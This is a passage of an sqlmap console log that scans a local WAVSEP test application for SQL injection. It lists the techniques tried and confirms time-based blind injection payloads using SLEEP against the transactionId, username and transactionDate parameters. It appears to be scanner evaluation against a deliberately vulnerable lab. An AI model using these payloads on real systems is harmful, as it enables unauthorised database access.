[04:53:14] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[04:53:14] [INFO] testing 'MySQL inline queries'
[04:53:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:53:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:53:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:53:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:53:15] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:53:15] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:53:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:53:25] [INFO] GET parameter 'transactionId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:53:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:53:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:53:25] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:53:25] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:53:25] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:53:25] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:53:26] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:53:26] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:53:26] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:53:26] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:53:26] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:53:26] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:53:26] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:53:26] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:53:26] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:53:26] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:53:27] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:53:27] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:53:27] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:53:27] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:53:27] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:53:27] [INFO] checking if the injection point on GET parameter 'transactionId' is a false positive
GET parameter 'transactionId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2934 HTTP(s) requests:
---
Parameter: transactionId (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionId=132 AND (SELECT 8794 FROM (SELECT(SLEEP(5)))VaIf)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:54:22] [INFO] the back-end DBMS is MySQL
[04:54:22] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[40/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp?username=user1
do you want to test this URL? [Y/n/q]
> Y
[04:54:22] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp?username=user1'                                                                                        
[04:54:22] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=E72F6BBB12F...EE7B3FE3A4'). Do you want to use those [Y/n] Y
[04:54:22] [INFO] testing if GET parameter 'username' is dynamic
[04:54:22] [WARNING] GET parameter 'username' does not appear to be dynamic
[04:54:22] [WARNING] heuristic (basic) test shows that GET parameter 'username' might not be injectable
[04:54:22] [INFO] testing for SQL injection on GET parameter 'username'
[04:54:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:54:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:54:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:54:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:54:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:54:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:54:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:54:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:54:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:54:25] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:54:25] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:54:25] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:54:25] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:54:25] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:54:25] [INFO] testing 'Generic inline queries'
[04:54:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:54:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:54:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:54:26] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:54:26] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[04:54:26] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[04:54:27] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[04:54:27] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[04:54:28] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[04:54:28] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[04:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[04:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[04:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[04:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[04:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[04:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[04:54:28] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:54:28] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[04:54:28] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:54:28] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[04:54:28] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[04:54:28] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[04:54:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:54:29] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:54:29] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:54:29] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:54:29] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:54:30] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:54:30] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:54:30] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:54:30] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:54:31] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:54:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:54:31] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:54:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:54:32] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:54:32] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:54:32] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:54:32] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:54:33] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:54:33] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:54:33] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:54:33] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:54:33] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:54:33] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:54:33] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:54:33] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:54:33] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[04:54:33] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[04:54:33] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[04:54:33] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[04:54:33] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[04:54:33] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[04:54:33] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[04:54:33] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[04:54:33] [INFO] testing 'MySQL inline queries'
[04:54:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:54:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:54:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:54:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:54:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:54:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:54:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:54:44] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:54:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:54:44] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:54:44] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:54:44] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:54:44] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:54:44] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:54:44] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:54:45] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:54:45] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:54:45] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:54:45] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:54:45] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:54:45] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:54:45] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:54:45] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:54:45] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:54:45] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:54:46] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:54:46] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:54:46] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:54:46] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:54:46] [INFO] checking if the injection point on GET parameter 'username' is a false positive
GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2964 HTTP(s) requests:
---
Parameter: username (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=user1' AND (SELECT 6819 FROM (SELECT(SLEEP(5)))RtRb)-- Bmfg
---
do you want to exploit this SQL injection? [Y/n] Y
[04:55:46] [INFO] the back-end DBMS is MySQL
[04:55:46] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[41/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case03-InjectionInView-Date-Blind-200ValidResponseWithDefaultOnException.jsp?transactionDate=2010-01-01
do you want to test this URL? [Y/n/q]
> Y
[04:55:46] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case03-InjectionInView-Date-Blind-200ValidResponseWithDefaultOnException.jsp?transactionDate=2010-01-01'                                                                              
[04:55:46] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=E7375C6FFFE...1CA14D7EC2'). Do you want to use those [Y/n] Y
[04:55:46] [INFO] testing if GET parameter 'transactionDate' is dynamic
[04:55:46] [WARNING] GET parameter 'transactionDate' does not appear to be dynamic
[04:55:46] [WARNING] heuristic (basic) test shows that GET parameter 'transactionDate' might not be injectable
[04:55:46] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[04:55:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:55:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:55:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:55:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:55:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:55:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:55:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:55:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:55:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:55:49] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:55:49] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:55:49] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:55:49] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:55:49] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:55:49] [INFO] testing 'Generic inline queries'
[04:55:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:55:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:55:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:55:49] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:55:50] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[04:55:50] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[04:55:50] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[04:55:51] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[04:55:51] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[04:55:51] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[04:55:51] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[04:55:51] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[04:55:51] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[04:55:51] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[04:55:51] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[04:55:51] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[04:55:51] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:55:51] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[04:55:51] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:55:51] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[04:55:51] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[04:55:52] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[04:55:52] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:55:52] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:55:52] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:55:52] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:55:53] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:55:53] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:55:53] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:55:53] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:55:53] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:55:54] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:55:54] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:55:54] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:55:54] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:55:55] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:55:55] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:55:55] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:55:55] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:55:55] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:55:56] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:55:56] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:55:56] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:55:56] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:55:56] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:55:56] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:55:56] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:55:56] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[04:55:56] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[04:55:56] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[04:55:56] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[04:55:56] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[04:55:56] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[04:55:56] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[04:55:56] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[04:55:56] [INFO] testing 'MySQL inline queries'
[04:55:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:55:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:55:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:55:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:55:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:55:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:55:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:56:06] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:56:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:56:06] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:56:07] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:56:07] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:56:07] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:56:07] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:56:07] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:56:07] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:56:07] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:56:07] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:56:07] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:56:07] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:56:08] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:56:08] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:56:08] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:56:08] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:56:08] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:56:08] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:56:08] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:56:08] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:56:08] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:56:08] [INFO] checking if the injection point on GET parameter 'transactionDate' is a false positive
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2964 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-01-01' AND (SELECT 3768 FROM (SELECT(SLEEP(5)))CKFZ)-- VFpu
---
do you want to exploit this SQL injection? [Y/n] Y
[04:57:09] [INFO] the back-end DBMS is MySQL
[04:57:09] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[42/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp?transactionId=895
do you want to test this URL? [Y/n/q]
> Y
[04:57:09] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp?transactionId=895'                                                                                                 
[04:57:09] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=32E488A37EC...D4EC2F5E42'). Do you want to use those [Y/n] Y
[04:57:09] [INFO] testing if GET parameter 'transactionId' is dynamic
[04:57:09] [WARNING] GET parameter 'transactionId' does not appear to be dynamic
[04:57:09] [WARNING] heuristic (basic) test shows that GET parameter 'transactionId' might not be injectable
[04:57:09] [INFO] testing for SQL injection on GET parameter 'transactionId'
[04:57:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:57:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:57:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:57:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:57:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:57:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:57:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:57:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:57:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:57:11] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:57:11] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:57:11] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:57:11] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:57:11] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:57:11] [INFO] testing 'Generic inline queries'
[04:57:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:57:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:57:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:57:11] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:57:11] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[04:57:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[04:57:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[04:57:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[04:57:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[04:57:13] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[04:57:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[04:57:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
